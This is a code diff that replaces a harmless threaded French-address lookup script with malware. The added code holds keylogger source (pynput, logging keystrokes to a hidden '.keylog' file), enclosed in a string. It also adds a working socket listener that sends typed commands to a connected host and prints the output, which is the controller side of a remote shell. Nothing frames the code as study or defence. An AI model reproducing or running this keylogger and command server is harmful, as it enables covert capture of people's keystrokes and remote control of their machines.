@@ -1,23 +1,26 @@
-import concurrent.futures
-import time
+"""from pynput.keyboard import Key, Listener
 
+def on_press(key):
+    f = open(".keylog", "a")
+    if str(key).split(".")[0] == "Key":
+        f.write("\n" + str(key) + "\n")
+    else:
+        f.write(str(key))
 
-BAN_API_URL = 'https://api-adresse.data.gouv.fr/search/'
+with Listener(on_press = on_press, on_release = None) as listener:
+    listener.join()"""
 
-def get_french_addresses(request):
-    time.sleep(2)
-    print(request)
+import socket
 
-request_data = [
-    {'search_field': '17 rue saint maur'},
-    {'search_field': '35 boulevard voltaire'},
-    {'search_field': '32 rue rivoli'},
-    {'search_field': 'Route de la Croqueterie'},
-]
+HOST = "192.168.24.5"
+PORT = 20030
 
-start_time = time.time()
-with concurrent.futures.ThreadPoolExecutor(max_workers = 4) as executor:
-    result = executor.map(get_french_addresses, request_data)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((HOST, PORT))
+s.listen(1)
+conn, addr = s.accept()
 
-end_time = time.time()
-print(f'Total time to run multithreads: {end_time - start_time:2f}s')
+while True:
+    comm = input("Enter commmand : ")
+    conn.send(bytes(comm + " c", encoding = "utf8"))
+    print(conn.recv(1024).decode())
